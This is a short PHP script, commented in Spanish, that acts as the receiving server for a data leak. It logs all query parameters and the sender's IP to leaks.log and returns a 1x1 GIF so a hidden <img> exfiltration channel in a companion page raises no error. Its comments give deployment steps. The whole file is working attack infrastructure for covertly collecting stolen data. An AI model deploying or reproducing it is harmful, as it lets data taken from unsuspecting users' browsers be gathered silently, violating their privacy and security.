<?php
// Receptor de la fuga. Despliega esto en un server con PHP y apuntá
// LEAK_ENDPOINT (en index.html) a .../receiver.php
// Las capturas quedan en leaks.log (mismo directorio).

$data = $_GET ?: [];
$line = date('c') . ' | ' . $_SERVER['REMOTE_ADDR'] . ' | ' . json_encode($data) . "\n";
file_put_contents(__DIR__ . '/leaks.log', $line, FILE_APPEND | LOCK_EX);

// Respuesta mínima (1x1 gif) para que el canal <img> no muestre error.
header('Content-Type: image/gif');
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==');
